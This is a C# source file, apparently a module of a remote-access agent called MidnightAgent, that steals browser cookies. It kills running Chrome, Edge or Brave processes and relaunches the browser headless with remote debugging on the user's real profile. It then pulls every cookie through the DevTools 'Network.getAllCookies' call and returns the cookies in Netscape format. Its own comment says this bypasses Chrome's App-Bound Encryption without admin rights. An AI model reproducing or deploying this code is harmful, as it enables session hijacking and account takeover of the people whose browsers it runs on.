using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.WebSockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

namespace MidnightAgent.Utils
{
    /// <summary>
    /// Extracts cookies using Chrome's Remote Debugging Protocol
    /// This bypasses v20 App-Bound Encryption without needing admin rights
    /// </summary>
    public static class RemoteDebugger
    {
        private const int DEBUG_PORT = 9222;
        private static string _lastError = "";

        public static string ExtractCookies(string browserName, StringBuilder debug)
        {
            string browserPath = null;
            string userDataDir = null;
            string processName = null;

            // Find browser paths
            switch (browserName.ToLower())
            {
                case "chrome":
                    browserPath = FindPath(new[] {
                        @"C:\Program Files\Google\Chrome\Application\chrome.exe",
                        @"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
                        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Google\Chrome\Application\chrome.exe")
                    });
                    userDataDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Google\Chrome\User Data");
                    processName = "chrome";
                    break;
                case "edge":
                    browserPath = FindPath(new[] {
                        @"C:\Program Files\Microsoft\Edge\Application\msedge.exe",
                        @"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
                        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Microsoft\Edge\Application\msedge.exe")
                    });
                    userDataDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Microsoft\Edge\User Data");
                    processName = "msedge";
                    break;
                case "brave":
                    browserPath = FindPath(new[] {
                        @"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",
                        @"C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe",
                        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"BraveSoftware\Brave-Browser\Application\brave.exe")
                    });
                    userDataDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"BraveSoftware\Brave-Browser\User Data");
                    processName = "brave";
                    break;
            }

            if (string.IsNullOrEmpty(browserPath) || !File.Exists(browserPath))
            {
                return $"Error: {browserName} not found";
            }

            if (!Directory.Exists(userDataDir))
            {
                return $"Error: User data directory not found: {userDataDir}";
            }

            debug?.AppendLine($"Browser: {browserPath}");
            debug?.AppendLine($"UserData: {userDataDir}");

            try
            {
                // Kill existing browser instances
                debug?.AppendLine("Killing existing browser...");
                KillProcess(processName);
                Thread.Sleep(3000); // Wait longer for browser to fully close

                // Start browser with remote debugging using ORIGINAL user data
                // (Go project does this - kill browser first, then use original profile)
                debug?.AppendLine("Starting browser with debug port...");
                var psi = new ProcessStartInfo
                {
                    FileName = browserPath,
                    Arguments = $"--remote-debugging-port={DEBUG_PORT} --remote-allow-origins=* --headless=new --disable-gpu --user-data-dir=\"{userDataDir}\"",
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                
                Process browserProc = null;
                try
                {
                    browserProc = Process.Start(psi);
                }
                catch (Exception ex)
                {
                    return $"Error starting browser: {ex.Message}";
                }
                
                if (browserProc == null)
                {
                    return "Error: Browser process is null";
                }
                
                debug?.AppendLine($"Browser PID: {browserProc.Id}");
                
                // Wait for browser to be ready with retry
                string wsUrl = null;
                _lastError = "";
                for (int attempt = 0; attempt < 15; attempt++)
                {
                    Thread.Sleep(1000);
                    wsUrl = GetDebugWsUrl();
                    if (!string.IsNullOrEmpty(wsUrl))
                    {
                        debug?.AppendLine($"Got WS URL on attempt {attempt + 1}");
                        break;
                    }
                }
                
                if (string.IsNullOrEmpty(wsUrl))
                {
                    debug?.AppendLine($"WS Error: {_lastError}");
                    KillProcess(processName);
                    return $"Error: Could not get WebSocket debug URL. {_lastError}";
                }
                debug?.AppendLine($"WebSocket URL: {wsUrl}");
                
                // IMPORTANT: Wait a bit before connecting to WebSocket
                Thread.Sleep(2000);

                // Connect and get cookies
                string cookies = GetCookiesViaWebSocket(wsUrl, debug);
                
                // Kill browser
                KillProcess(processName);

                if (string.IsNullOrEmpty(cookies))
                {
                    return "Error: No cookies retrieved";
                }

                return cookies;
            }
            catch (Exception ex)
            {
                KillProcess(processName);
                return $"Error: {ex.Message}";
            }
        }

        private static string FindPath(string[] paths)
        {
            foreach (var path in paths)
            {
                if (File.Exists(path)) return path;
            }
            return null;
        }

        private static void KillProcess(string processName)
        {
            try
            {
                foreach (var proc in Process.GetProcessesByName(processName))
                {
                    try { proc.Kill(); proc.WaitForExit(2000); } catch { }
                }
            }
            catch { }
        }

        private static string GetDebugWsUrl()
        {
            try
            {
                using (var client = new WebClient())
                {
                    string json = client.DownloadString($"http://localhost:{DEBUG_PORT}/json");
                    var data = JsonConvert.DeserializeObject<JArray>(json);
                    if (data != null && data.Count > 0)
                    {
                        return data[0]["webSocketDebuggerUrl"]?.ToString();
                    }
                    _lastError = "No pages in response";
                }
            }
            catch (Exception ex)
            {
                _lastError = ex.Message;
            }
            return null;
        }

        private static string GetCookiesViaWebSocket(string wsUrl, StringBuilder debug)
        {
            try
            {
                using (var ws = new ClientWebSocket())
                {
                    // Connect with timeout
                    var connectTask = ws.ConnectAsync(new Uri(wsUrl), CancellationToken.None);
                    if (!connectTask.Wait(15000))
                    {
                        return "Error: WebSocket connect timeout";
                    }
                    debug?.AppendLine("WebSocket connected");

                    // Send command to get all cookies
                    var command = new { id = 1, method = "Network.getAllCookies" };
                    string cmdJson = JsonConvert.SerializeObject(command);
                    var sendBuffer = Encoding.UTF8.GetBytes(cmdJson);
                    var sendTask = ws.SendAsync(new ArraySegment<byte>(sendBuffer), WebSocketMessageType.Text, true, CancellationToken.None);
                    sendTask.Wait(5000);
                    debug?.AppendLine("Command sent");

                    // Receive response with longer timeout
                    Thread.Sleep(500); // Give server time to respond
                    
                    var receiveBuffer = new byte[1024 * 1024]; // 1MB buffer
                    int totalReceived = 0;
                    
                    // Loop to receive all data
                    var cts = new CancellationTokenSource(30000); // 30 second total timeout
                    while (ws.State == WebSocketState.Open)
                    {
                        try
                        {
                            var receiveTask = ws.ReceiveAsync(new ArraySegment<byte>(receiveBuffer, totalReceived, receiveBuffer.Length - totalReceived), cts.Token);
                            if (!receiveTask.Wait(10000))
                            {
                                debug?.AppendLine("Receive timeout, checking data...");
                                break;
                            }
                            
                            var result = receiveTask.Result;
                            totalReceived += result.Count;
                            debug?.AppendLine($"Received chunk: {result.Count} bytes, total: {totalReceived}");
                            
                            if (result.EndOfMessage)
                            {
                                break;
                            }
                        }
                        catch (Exception recvEx)
                        {
                            debug?.AppendLine($"Receive chunk error: {recvEx.Message}");
                            break;
                        }
                    }
                    
                    if (totalReceived == 0)
                    {
                        return "Error: No data received from WebSocket";
                    }
                    
                    string response = Encoding.UTF8.GetString(receiveBuffer, 0, totalReceived);
                    debug?.AppendLine($"Total response: {totalReceived} bytes");

                    // Parse cookies
                    var responseObj = JsonConvert.DeserializeObject<JObject>(response);
                    var cookies = responseObj?["result"]?["cookies"] as JArray;

                    if (cookies == null || cookies.Count == 0)
                    {
                        debug?.AppendLine($"Response preview: {response.Substring(0, Math.Min(500, response.Length))}");
                        return "Error: No cookies in response";
                    }
                    
                    debug?.AppendLine($"Found {cookies.Count} cookies");

                    // Convert to Netscape format
                    var sb = new StringBuilder();
                    foreach (var cookie in cookies)
                    {
                        string domain = cookie["domain"]?.ToString() ?? "";
                        string httpOnly = (bool)(cookie["httpOnly"] ?? false) ? "TRUE" : "FALSE";
                        string path = cookie["path"]?.ToString() ?? "/";
                        string secure = (bool)(cookie["secure"] ?? false) ? "TRUE" : "FALSE";
                        string expires = cookie["expires"]?.ToString() ?? "0";
                        string name = cookie["name"]?.ToString() ?? "";
                        string value = cookie["value"]?.ToString() ?? "";

                        sb.AppendLine($"{domain}\t{httpOnly}\t{path}\t{secure}\t{expires}\t{name}\t{value}");
                    }

                    return sb.ToString();
                }
            }
            catch (AggregateException ae)
            {
                var innerMessage = ae.InnerException?.Message ?? ae.Message;
                debug?.AppendLine($"WS AggregateException: {innerMessage}");
                return $"WebSocket Error: {innerMessage}";
            }
            catch (Exception ex)
            {
                debug?.AppendLine($"WS Exception: {ex.GetType().Name}: {ex.Message}");
                return $"WebSocket Error: {ex.Message}";
            }
        }
    }
}
